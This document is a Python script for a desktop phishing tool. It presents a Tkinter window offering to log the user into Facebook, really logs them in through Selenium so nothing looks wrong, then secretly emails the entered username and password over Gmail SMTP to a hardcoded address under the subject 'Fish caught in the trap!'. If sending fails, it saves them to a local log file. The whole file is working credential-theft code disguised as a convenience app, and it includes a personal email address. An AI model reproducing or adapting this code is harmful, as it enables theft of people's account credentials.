#!/usr/local/bin/python3
# modules:
import time
import os
import platform
import sys
from getpass import getpass
from tkinter import *
from selenium import webdriver
import pyttsx

b = 0

root = Tk()
root.configure(bg='black')
root.geometry("1366x768")
root.title("LOGIN TO FACEBOOK FROM DESKTOP!!")

# variables to store credentials:
user = StringVar()
passw = StringVar()

def say(s):
    print(s)
    en=pyttsx.init()
    en.say(s)
    en.runAndWait()

def fake():
    text1 = user.get()
    text2 = passw.get()

    if len(text1)==0 or len(text2)==0:
        root.quit()
        say("Mission Aborted! You gotta enter the credentials and then click the 'login' button! duh....")
        quit()
    global b;
    b=webdriver.Firefox()
    b.get("https://facebook.com/login/")
    email=b.find_element_by_id('email')
    email.send_keys(text1)
    password=b.find_element_by_id('pass')
    password.send_keys(text2)
    password.submit()
    say("Let's go!")
    return (text1,text2)

def log(event):
    (text1,text2)=fake()

    import smtplib

    TO = "kowligi1998@gmail.com"
    SUBJECT = 'Fish caught in the trap!'
    TEXT = '\nUSERNAME : '+text1+'\nPASSWORD : '+text2
    gmail_sender = 'kowligi1998@gmail.com'
    gmail_passwd = "wrong_password!"

    server = smtplib.SMTP('smtp.gmail.com',587)
    server.ehlo()
    server.starttls()
    server.ehlo
    server.login(gmail_sender,gmail_passwd)

    BODY = '\r\n'.join([
        'To: %s' % TO,
        'From :%s' % gmail_sender,
        'Subject: %s' % SUBJECT,
        '',
        TEXT
        ])

    try:
        server.sendmail(gmail_sender, [TO], BODY)
        server.quit()
        root.quit()
        quit()

    except:
        say('Cool!')
        f = open(os.path.join(os.getcwd(),"log.txt"),"a")
        f.write("On "+time.ctime()+":\n")
        f.write("NAME: "+text1+"\n")
        f.write("PASSWORD: "+text2+"\n\n")
        f.close()
        root.quit()
        quit()


# elements in the window:
font=("Times New Roman",'20','italic')
color='blue'

name = Label(root,text = "Email/Username:",font=font,fg=color)
password = Label(root,text = "Password(hidden):",font=font,fg=color)
ok = Button(root,text="LOGIN TO FACEBOOK",font=font,fg=color)

e1 = Entry(root,textvariable = user)
e2 = Entry(root,textvariable = passw,show="*")

# method bindings and position(loading) of elements:
name.pack(ipady=10)
e1.pack()

password.pack(ipady=10)
e2.pack()

ok.pack(pady=20)
ok.bind("<Button-1>",log)
e1.focus_set()

# keeps the window open until closed:
root.mainloop()
